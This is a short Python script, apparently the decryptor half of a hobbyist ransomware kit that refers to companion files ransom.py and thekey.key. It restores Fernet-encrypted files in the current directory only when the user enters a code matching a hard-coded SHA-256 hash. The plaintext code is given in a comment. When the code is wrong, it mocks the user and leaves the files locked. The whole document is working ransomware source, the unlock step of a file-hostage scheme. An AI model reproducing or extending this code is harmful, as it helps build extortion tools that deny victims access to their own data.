
#!/usr/bin/env python3
#the code is "miskuroisgreat"
#to change the code just make a new file and use hashlib to hash the code u wanna use and copy the hashed code and copy it 
#to the realCode variable



import os
from cryptography.fernet import Fernet
import hashlib

files = []

for file in os.listdir():
	if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


code = input("What is the code:\n")
realCode = "0bd2efc433def2b85bfe49eda9af8f6b5b8c477a0439bfb14136c4f1f95d0256"

hashed_code = hashlib.sha256(code.encode()).hexdigest()




with open("thekey.key", "rb") as key:
	secretkey = key.read()



if realCode == hashed_code:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("alr  here ur files")
else:
	print("ye u aint getting them filess")
